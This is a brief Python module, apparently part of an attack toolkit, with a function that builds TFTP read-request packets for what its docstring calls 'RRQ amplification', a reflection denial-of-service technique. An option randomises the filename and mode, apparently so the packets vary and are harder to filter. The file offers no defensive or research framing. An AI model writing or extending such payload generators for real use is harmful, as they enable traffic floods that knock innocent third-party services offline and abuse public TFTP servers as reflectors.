import random

def generate_payload(target, options=None):
    """
    TFTP RRQ amplification, supports custom filename/mode/mutation
    options:
      - filename: str, filename
      - mode: str, transfer mode
      - mutate: bool, whether to mutate
    """
    filename = options.get('filename', 'test') if options else 'test'
    mode = options.get('mode', 'octet') if options else 'octet'
    mutate = options.get('mutate', False) if options else False
    if mutate:
        filename = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(4,12)))
        mode = random.choice(['octet','netascii','mail'])
    return b'\x00\x01' + filename.encode() + b'\x00' + mode.encode() + b'\x00'